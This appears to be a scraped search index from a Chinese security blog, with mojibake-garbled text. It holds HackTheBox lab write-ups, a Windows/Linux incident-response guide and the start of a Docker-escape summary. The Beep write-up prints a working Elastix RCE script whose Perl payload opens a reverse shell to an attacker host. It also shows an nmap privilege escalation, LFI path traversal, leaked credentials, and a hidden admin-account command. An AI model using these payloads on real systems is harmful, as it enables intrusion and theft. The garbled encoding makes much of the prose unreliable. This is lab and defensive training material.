hashï¼ŒçŒœæµ‹å­˜åœ¨å¯†ç å¤ç”¨çš„æƒ…å†µï¼Œç»“åˆä¹‹å‰å·¥å•ç³»ç»Ÿä¸­ç•™ä¸‹çš„å¯†ç æ„é€ çš„çº¿ç´¢ï¼Œåˆ©ç”¨ hashcat è¿›è¡Œå¯†ç ç ´è§£ï¼Œå¾—åˆ°å¯†ç æ˜æ–‡ä¸ºï¼šPleaseSubscribe!21 SU åˆ‡æ¢ç”¨æˆ·ï¼š å¾—åˆ° root ç”¨æˆ·çš„ flagã€‚ ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:2:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["é¶åœº"],"content":"Hack the box - Beep","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"Hack The Box - Beep ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:0:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æ”¶é›† nmap -T4 -A 10.10.10.7 80 ç«¯å£ä¸º Elastix åº”ç”¨ï¼š åˆ©ç”¨ searchsploit å¯»æ‰¾å†å²æ¼æ´ï¼š ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:1:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"æ¼æ´ç‚¹ä¸€ å‘ç°ä¸€å¤„ LFI æ¼æ´ï¼Œå°è¯•åˆ©ç”¨ï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼š å‘ç°ç”¨æˆ·åä¸å¯†ç ï¼šadmin:jEhdIekWmdjEã€‚ ä½¿ç”¨è¯¥å¯†é’¥å°è¯•ç™»å½•ï¼Œè¿›å…¥åå°ï¼š ä½¿ç”¨è¯¥å¯†é’¥å°è¯•ç™»å½• SSHï¼š å‘ç°å¯†é’¥é‡ç”¨çš„é—®é¢˜ï¼Œç›´æ¥ getshellã€‚ ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:1","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"æ¼æ´ç‚¹äºŒ å‘ç°å†å²æ¼æ´åº“ä¸­ä¸€å¤„ RCE æ¼æ´ï¼šhttps://www.exploit-db.com/exploits/18650 ä¿®æ”¹ payloadï¼ŒåŒ…æ‹¬ rhostã€lhostã€lportã€extension import urllib import ssl rhost=\"10.10.10.7\" lhost=\"10.10.14.7\" lport=4444 extension=\"233\" ctx = ssl.create_default_context() ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE # Reverse shell payload url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c\u0026callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A' urllib.urlopen(url, context=ctx) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u003center\u003e for help # nmap\u003e !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) SIP extension åœ¨ç™»å½•ç®¡ç†åå°å¯ä»¥ç¡®å®š ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:2","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["é¶åœº"],"content":"æ¼æ´ç‚¹ä¸‰ æ‰«ç›®å½•æ—¶å‘ç° vtigercrm ç›®å½•ï¼Œå¯»æ‰¾å†å²æ¼æ´ï¼Œå­˜åœ¨ LFIï¼š https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00 åŒæ ·å¯ä»¥åŒ…å« /etc/amportal.confï¼Œè·å–å¯†ç ä¿¡æ¯ã€‚ æ­¤å¤–ï¼Œåœ¨ MSF ä¸ŠåŒæ ·æœ‰ vtigercrm çš„æ¼æ´ï¼š ä½¿ç”¨ 1 å¤±è´¥ï¼Œä½¿ç”¨ 2 æˆåŠŸã€‚ ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:3","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åº”æ€¥å“åº”","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åº”æ€¥å“åº” ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:0:0","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 Windows åº”æ€¥å“åº” ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:0","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 æ–‡ä»¶åˆ†æ 1.1.1 å¼€æœºå¯åŠ¨é¡¹ åˆ©ç”¨æ“ä½œç³»ç»Ÿä¸­çš„å¯åŠ¨èœå•ï¼š C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup åˆ©ç”¨ç³»ç»Ÿé…ç½® msconfigï¼š åˆ©ç”¨æ³¨å†Œè¡¨ï¼š HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\software\\Microsoft\\Windows\\CurrentVersion\\Run 1.1.2 tmp ä¸´æ—¶æ–‡ä»¶å¤¹ ä½¿ç”¨ cmdï¼Œè¾“å…¥ %tmp%ï¼Œç›´æ¥æ‰“å¼€ä¸´æ—¶æ–‡ä»¶å¤¹ æŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹ä¸‹æ˜¯å¦æœ‰å¯ç–‘æ–‡ä»¶ï¼ˆexeã€dllã€sysï¼‰ 1.1.3 æµè§ˆå™¨å†å²è®°å½• å·¥å…·åœ°å€ï¼šhttps://launcher.nirsoft.net/downloads/index.html browsinghistoryview browserdownloadsview 1.1.4 æ–‡ä»¶å±æ€§åˆ†æ åœ¨ Windows ç³»ç»Ÿä¸‹ï¼Œæ–‡ä»¶å±æ€§çš„æ—¶é—´å±æ€§å…·æœ‰ï¼šåˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ã€è®¿é—®æ—¶é—´ï¼ˆé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨ï¼‰é»˜è®¤æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºæ˜¯ä»¥ä¿®æ”¹æ—¶é—´ä½œä¸ºå±•ç¤ºã€‚ å¦‚æœä¿®æ”¹æ—¶é—´è¦æ—©äºåˆ›å»ºæ—¶é—´é‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å­˜åœ¨å¾ˆå¤§å¯ç–‘ã€‚ä½¿ç”¨ä¸­å›½èœåˆ€ç­‰å·¥å…·ä¿®æ”¹çš„ä¿®æ”¹æ—¶é—´ï¼Œé€šè¿‡æ–‡ä»¶å±æ€§å¯ä»¥æŸ¥çœ‹åˆ°åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ã€è®¿é—®æ—¶é—´ã€‚ 1.1.5 æœ€è¿‘æ‰“å¼€æ–‡ä»¶åˆ†æ Windows ç³»ç»Ÿä¸­é»˜è®¤è®°å½•ç³»ç»Ÿä¸­æœ€è¿‘æ‰“å¼€ä½¿ç”¨çš„æ–‡ä»¶ä¿¡æ¯ã€‚ å¯ä»¥åœ¨ç›®å½• C:\\Documents and Settings\\Administrator\\Recent ä¸‹æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ win+R æ‰“å¼€è¿è¡Œï¼Œè¾“å…¥ %UserProfile%\\Recent æŸ¥çœ‹ã€‚ç„¶ååˆ©ç”¨ Windows ä¸­çš„ç­›é€‰æ¡ä»¶æŸ¥çœ‹å…·ä½“æ—¶é—´èŒƒå›´çš„æ–‡ä»¶ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:1","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 è¿›ç¨‹åˆ†æ 1.2.1 å¯ç–‘è¿›ç¨‹å‘ç°ä¸å…³é—­ è®¡ç®—æœºä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡æ˜¯å»ºç«‹åœ¨ TCP æˆ– UDP åè®®ä¸Šçš„ï¼Œå¹¶ä¸”æ¯ä¸€æ¬¡é€šä¿¡éƒ½æ˜¯å…·æœ‰ä¸åŒçš„ç«¯å£ï¼ˆ0~65535ï¼‰ã€‚å¦‚æœè®¡ç®—æœºè¢«æœ¨é©¬åï¼Œè‚¯å®šä¼šä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥é€šè¿‡æŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ï¼Œæ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ IDï¼Œç„¶åå…³é—­è¿›ç¨‹ ID å°±å¯ä»¥å…³é—­è¿æ¥çŠ¶æ€ã€‚ # æŸ¥çœ‹ç½‘ç»œå»ºç«‹è¿æ¥çŠ¶æ€ netstat -ano | find \"ESTABLISHED\" # æŸ¥çœ‹å…·ä½“ PID è¿›ç¨‹å¯¹åº”çš„ç¨‹åº tasklist /svc | find \"PID\" taskill /PID pidå€¼ /T å…³é—­è¿›ç¨‹ 1.2.2 Window è®¡åˆ’ä»»åŠ¡ åœ¨è®¡ç®—æœºä¸­å¯ä»¥é€šè¿‡è®¾å®šè®¡åˆ’ä»»åŠ¡ï¼Œåœ¨å›ºå®šæ—¶é—´æ‰§è¡Œå›ºå®šæ“ä½œã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¶æ„ä»£ç ä¹Ÿæœ‰å¯èƒ½åœ¨å›ºå®šçš„æ—¶é—´è®¾ç½®æ‰§è¡Œã€‚ ä½¿ç”¨ at æˆ– schtasks å‘½ä»¤å¯ä»¥å¯¹è®¡åˆ’ä»»åŠ¡è¿›è¡Œç®¡ç†ï¼Œç›´æ¥è¾“å…¥ at å¯ä»¥æŸ¥çœ‹å½“å‰è®¡ç®—æœºä¸­ä¿å­˜çš„è®¡åˆ’ä»»åŠ¡ã€‚ ä¹Ÿå¯ä»¥åœ¨è®¡åˆ’ä»»åŠ¡ç¨‹åºä¸­æ‰“å¼€ï¼š 1.2.3 éšè—è´¦æˆ·å‘ç°ä¸åˆ é™¤ éšè—è´¦å·ï¼Œæ˜¯æŒ‡â€œé»‘å®¢â€å…¥ä¾µä¹‹åä¸ºäº†èƒ½å¤ŸæŒä¹…ä¿æŒå¯¹è®¡ç®—æœºè®¿é—®ï¼Œè€Œåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­å»ºç«‹çš„ä¸è½»æ˜“è¢«å‘ç°çš„è®¡ç®—æœºè´¦æˆ·ã€‚ æœ€ä¸ºç®€å•çš„éšè—è´¦æˆ·å»ºç«‹ï¼š net user test$ test /add \u0026\u0026 net localgroup administrator test$ /add å…¶ä¸­ $ ç¬¦å·å¯ä»¥å¯¼è‡´ç³»ç»Ÿç®¡ç†å‘˜åœ¨ä½¿ç”¨ net user æ—¶æ— æ³•æŸ¥çœ‹åˆ° test$ ç”¨æˆ·ã€‚ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:2","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.3 ç³»ç»Ÿä¿¡æ¯ 1.3.1 è¡¥ä¸æŸ¥çœ‹ä¸æ›´æ–° Windows ç³»ç»Ÿæ”¯æŒè¡¥ä¸ä»¥ä¿®è¡¥æ¼æ´ã€‚å¯ä»¥ä½¿ç”¨ systeminfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œå¹¶å±•ç¤ºå¯¹åº”çš„ç³»ç»Ÿè¡¥ä¸ä¿¡æ¯ç¼–å·ã€‚ ä¹Ÿå¯ä»¥åœ¨å¸è½½è½¯ä»¶ä¸­æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸å’Œç¬¬ä¸‰æ–¹è½¯ä»¶è¡¥ä¸ã€‚ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:3","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.4 webshell æŸ¥æ€ å¸¸è§å·¥å…·ï¼šD ç›¾ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:4","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 linux åˆ†ææ’æŸ¥ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:0","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 æ–‡ä»¶åˆ†æ 2.1.1 tmp ç›®å½• åœ¨ Linux ç³»ç»Ÿä¸‹ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ã€‚å…¶ä¸­ /tmp æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„ä¸´æ—¶ç›®å½•æ–‡ä»¶ã€‚æ¯ä¸ªç”¨æˆ·éƒ½å¯ä»¥å¯¹å®ƒè¿›è¡Œè¯»å†™æ“ä½œã€‚å› æ­¤ä¸€ä¸ªæ™®é€šç”¨æˆ·å¯ä»¥å¯¹ /tmpç›®å½•æ‰§è¡Œè¯»å†™æ“ä½œã€‚ 2.1.2 å¼€æœºå¯åŠ¨é¡¹ æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹å†…å®¹ /etc/init.d/ï¼Œæ¶æ„ä»£ç å¾ˆæœ‰å¯èƒ½è®¾ç½®åœ¨å¼€æœºè‡ªå¯åŠ¨çš„ä½ç½®ã€‚ æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹æ–‡ä»¶æ—¶é—´é¡ºåºçš„æ’åºï¼šIs-alt| head -n 10 æŸ¥çœ‹æ–‡ä»¶æ—¶é—´å±æ€§ï¼šstat æ–‡ä»¶å ä½¿ç”¨ update-rc.d ç¨‹åºåç§° enable è®¾ç½®å¼€æœºè‡ªå¯ ä½¿ç”¨ update-rc.d ç¨‹åºåç§° disable ç¦æ­¢å¼€æœºè‡ªå¯ 2.1.3 æ–‡ä»¶ä¿®æ”¹æ—¶é—´æœç´¢ æ–°å¢æ–‡ä»¶åˆ†æï¼š æŸ¥æ‰¾ 24 å°æ—¶å†…è¢«ä¿®æ”¹çš„æ–‡ä»¶ find ./ -mtime 0 -name \"*.php\" æŸ¥æ‰¾ 72 å°æ—¶å†…æ–°å¢çš„æ–‡ä»¶ find ./ -ctime -2 -name \"*.php\" æƒé™æŸ¥æ‰¾ find ./ -iname \"*.php\" -perm 777 -iname å¿½ç•¥å¤§å°å†™ï¼Œ-perm ç­›é€‰æ–‡ä»¶æƒé™ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:1","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 è¿›ç¨‹åˆ†æ 2.2.1 ç½‘ç»œè¿æ¥åˆ†æ åœ¨ Linux ä¸­å¯ä»¥ä½¿ç”¨ netstat è¿›è¡Œç½‘ç»œè¿æ¥æŸ¥çœ‹ã€‚ netstat -Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships å¸¸ç”¨å‘½ä»¤ netstat -pantl æŸ¥çœ‹å¤„äº tcp ç½‘ç»œå¥—æ¥å­—ç›¸å…³ä¿¡æ¯ã€‚ å…³é—­æœªçŸ¥è¿æ¥ kill -9 PID å³å¯ã€‚ 2.2.2 è¿›ç¨‹å¯¹åº”çš„æ–‡ä»¶ åœ¨ linux ä¸­å¯ä»¥ä½¿ç”¨ ps æŸ¥çœ‹è¿›ç¨‹ç›¸å…³ä¿¡æ¯ ä½¿ç”¨ ps aux æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ ä½¿ç”¨ ps -aux| grep PID ç­›é€‰å‡ºå…·ä½“ PID çš„è¿›ç¨‹ä¿¡æ¯ï¼Œlsof -iï¼šç«¯å£å·ä¹Ÿå¯ä»¥å®ç°ç±»ä¼¼åŠŸèƒ½ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:2","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 ç™»å½•åˆ†æ åœ¨ Linux åšçš„æ“ä½œéƒ½ä¼šè¢«è®°å½•åˆ°ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œå¯¹äºç™»å½•ä¹Ÿå¯ä»¥æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸ç™»å½•ã€‚last å‘½ä»¤ last -i | grep -v 0.0.0.0 æŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼Œç­›é€‰éæœ¬åœ°ç™»å½•ã€‚ w å‘½ä»¤å®æ—¶æŸ¥çœ‹ç™»å½•ç”¨æˆ· ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:3","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 å¼‚å¸¸ç”¨æˆ·çš„åˆ†ææ’æŸ¥ åœ¨ Linux ä¸­ root ç”¨æˆ·æ˜¯ä¸€ä¸ªæ— æ•Œçš„å­˜åœ¨ï¼Œå¯ä»¥åœ¨ Linux ä¸Šåšä»»ä½•äº‹æƒ…ã€‚ æ–°å»ºç”¨æˆ· useradd username è®¾ç½®å¯†ç  passwd username è¾“å‡ºå¯†ç  è®¾ç½®ç”¨æˆ· uid å’Œ gid éƒ½ä¸º 0ã€‚ï¼ˆroot ç”¨æˆ· uid ä¸º 0 gid ä¸º 0ï¼‰ä¿®æ”¹æ–‡ä»¶å³å¯ /etc/passwd cat /etc/passwd grep \"0:0\" /etc/passwd ls -l /etc/passwd awk -F: '$3==0 {print $1}' /etc/passwd awk -Fï¼š'$2==\"ï¼â€{print $1}' /etc/shadow æˆ– awk -Fï¼š'lengthï¼ˆ$2ï¼‰==0 {print $1}' /etc/shadow ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:4","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.5 å†å²å‘½ä»¤åˆ†æ åœ¨ Linux ç³»ç»Ÿä¸­é»˜è®¤ä¼šè®°å½•ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤ /root/bash history æ–‡ä»¶ä¸­ã€‚ ç”¨æˆ·å¯ä»¥ä½¿ç”¨ cat /root/.bash_history è¿›è¡ŒæŸ¥çœ‹æˆ–è€…ä½¿ç”¨ history å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:5","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.6 è®¡åˆ’ä»»åŠ¡æ’æŸ¥ åœ¨ Linux ç³»ç»Ÿä¸­å¯ä»¥ä½¿ç”¨å‘½ä»¤ crontab è¿›è¡Œè®¡åˆ’ä»»åŠ¡çš„è®¾å®š å…¶ä¸­ -e å¯ä»¥ç”¨æ¥ç¼–è¾‘è®¾å®šè®¡åˆ’ä»»åŠ¡ï¼Œ-l å¯ä»¥ç”¨æ¥æŸ¥çœ‹å½“å‰è®¡åˆ’ä»»åŠ¡ï¼Œ-d ç”¨æ¥åˆ é™¤è®¡åˆ’ä»»åŠ¡ã€‚ç‰¹åˆ«æ³¨æ„è®¡åˆ’ä»»åŠ¡ä¸­æœªçŸ¥å†…å®¹ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:6","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.7 å¼‚å¸¸ $PAHT ç¯å¢ƒå˜é‡çš„æ’æŸ¥ ç¯å¢ƒå˜é‡å†³å®šäº† shell å°†åˆ°å“ªäº›ç›®å½•ä¸­å¯»æ‰¾å‘½ä»¤æˆ–ç¨‹åºï¼ŒPATH çš„å€¼æ˜¯ä¸€ç³»åˆ—ç›®å½•ï¼Œå½“æ‚¨è¿è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼ŒLinux åœ¨è¿™äº›ç›®å½•ä¸‹è¿›è¡Œæœå¯»ç¼–è¯‘é“¾æ¥ã€‚ ä¿®æ”¹ PATH ï¼š export PATH=$PATH:/usr/locar/new/bin # æœ¬æ¬¡ç»ˆç«¯ä¸­æœ‰æ•ˆï¼Œé‡å¯åæ— æ•ˆã€‚ # åœ¨ /etc/profileæˆ–/home/.bashrcï¼ˆsource ~/.bashrcï¼‰æ‰èƒ½æ°¸ä¹…ç”Ÿæ•ˆã€‚ ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:7","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.8 åé—¨è‡ªåŠ¨æ’æŸ¥ - rkhunter Rkhunter å…·æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š ç³»ç»Ÿå‘½ä»¤æ£€æµ‹ï¼ŒMD5 æ ¡éªŒ Rookit æ£€æµ‹ æœ¬æœºæ•æ„Ÿç›®å½•ã€ç³»ç»Ÿé…ç½®å¼‚å¸¸æ£€æµ‹ å®‰è£…ï¼šapt install rkhunter åŸºæœ¬ä½¿ç”¨ï¼š rkhunter -check-sk -c,--check # Check the local system -sk --skip-keypress # Don't wait for a keypress after each test ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:8","tags":["æ¸—é€æµ‹è¯•","åº”æ€¥å“åº”"],"title":"åº”æ€¥å“åº”","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 Docker æ ¸å¿ƒæŠ€æœ¯ Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œå¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»»ä½•åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œå®Œç¾çš„è§£å†³äº†æµ‹è¯•ç¯å¢ƒä¸ç”Ÿäº§ç¯å¢ƒçš„æŸäº›ä¸ä¸€è‡´æ€§é—®é¢˜ã€‚ç›¸æ¯”äºä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œ Docker å®¹å™¨ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºå†…æ ¸ï¼Œä¹Ÿä¸å­˜åœ¨ç¡¬ä»¶çš„è™šæ‹Ÿï¼Œè¦è½»ä¾¿è®¸å¤šã€‚ Docker è‡ªå‡ºç°åä¾¿ç»å¸¸ä¸è™šæ‹Ÿæœºåšæ¯”è¾ƒï¼Œæœ‰äº›äººç”šè‡³è®¤ä¸º Docker å°±æ˜¯ä¸€ç§è™šæ‹Ÿæœºã€‚è™šæ‹Ÿæœºæ€»çš„æ¥è¯´æ˜¯åˆ©ç”¨ Hypervisor è™šæ‹Ÿå‡ºå†…å­˜ã€CPUç­‰ç­‰ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€å¼ å›¾ï¼šæˆ‘ä»¬æŠŠå›¾ä¸­çš„çŸ©å½¢çœ‹ä½œä¸€ä¸ªè®¡ç®—æœºï¼Œå†…éƒ¨çš„åœ†åœˆçœ‹ä½œä¸€ä¸ªåˆä¸€ä¸ªçš„è¿›ç¨‹ï¼Œå®ƒä»¬ä½¿ç”¨ç€ç›¸åŒçš„è®¡ç®—æœºèµ„æºï¼Œå¹¶ä¸”ç›¸äº’ä¹‹é—´å¯ä»¥çœ‹åˆ°ã€‚ Docker åšäº†ä»€ä¹ˆäº‹å‘¢ï¼ŸDocker ç»™å®ƒä»¬åŠ äº†ä¸€å±‚å£³ï¼Œä½¿å®ƒä»¬éš”ç¦»å¼€æ¥ï¼Œæ­¤æ—¶å®ƒä»¬ä¹‹é—´æ— 